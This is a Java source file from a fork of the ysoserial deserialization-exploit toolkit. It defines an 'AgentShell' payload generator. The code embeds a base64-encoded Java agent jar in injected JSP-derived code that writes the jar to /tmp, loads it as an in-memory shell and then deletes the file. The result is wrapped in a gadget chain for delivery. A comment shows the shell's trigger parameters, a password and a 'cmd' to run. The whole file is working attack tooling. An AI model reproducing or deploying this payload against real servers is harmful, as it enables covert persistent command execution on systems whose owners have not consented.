package ysoserial.payloads.memshell;

import ysoserial.payloads.Eval;
import ysoserial.payloads.util.ClassFiles;
import ysoserial.payloads.util.Encoder;
import ysoserial.payloads.util.JavaCompiler;
import ysoserial.payloads.util.ReadWrite;

// ?password=1nhann&cmd=id
//https://github.com/1nhann/agentshell_jar
public class AgentShell {
    public static void main(String[] args) {

    }
    public Object getObject(Class gadget,String jarPath) throws Exception {
        byte[] bytes = ReadWrite.readResource(AgentShell.class, "内存马/agent/AgentShell.java");
        String java = new String(bytes);
        java = java.replace("%jarPath%",jarPath);
        byte[] b = JavaCompiler.compile("AgentShell",java);
        Class c = ClassFiles.bytesAsClass(b);
        Object o = new Eval().getObject(gadget,c);
        return o;
    }

    public Object getObject(Class gadget) throws Exception {
        String jarPath = "/tmp/1nhann.jar";
        byte[] jarContent = ReadWrite.readResource(AgentShell.class, "内存马/agent/agentshell.jar");
        Object o = getObject(gadget,jarContent,jarPath);
        return o;
    }

    public Object getObject(Class gadget,byte[] jarContent,String jarPath) throws Exception {

        String b64 = Encoder.base64_encode(jarContent);
        String code = new String(ReadWrite.readResource(AgentShell.class, "eval/update_file.jsp"));

        int i = 0;
        long l = b64.length();

        StringBuilder sb = new StringBuilder();

        sb.append("String b[] = new String[]{\n");

        while (i + 0xc000 < l){
            sb.append("\"" + b64.substring(i,i + 0xc000) + "\",");
            i += 0xc000;
        }
        sb.append("\"" + b64.substring(i,b64.length()) + "\",\n};\n");

        sb.append("String b64 = String.join(\"\",b);\n");
        b64 = sb.toString();

        code = code.replace("String b64 = \"%b64%\";",b64).replace("%destination%",jarPath);
        code = Eval.getJavaCodeFromJSP(code);

        byte[] bytes = ReadWrite.readResource(AgentShell.class, "内存马/agent/AgentShell.java");
        String java = new String(bytes);
        java = java.replace("%jarPath%",jarPath);

        java = java.replace("int flag1 = 0;",code);

        bytes = ReadWrite.readResource(AgentShell.class,"eval/delete_file.jsp");
        code = new String(bytes);
        code = Eval.getJavaCodeFromJSP(code);
        code = code.replace("%path%",jarPath);
        java = java.replace("int flag2 = 0;",code);

        byte[] b = JavaCompiler.compile("AgentShell",java);
        Class c = ClassFiles.bytesAsClass(b);
        Object o = new Eval().getObject(gadget,c);
        return o;
    }
}
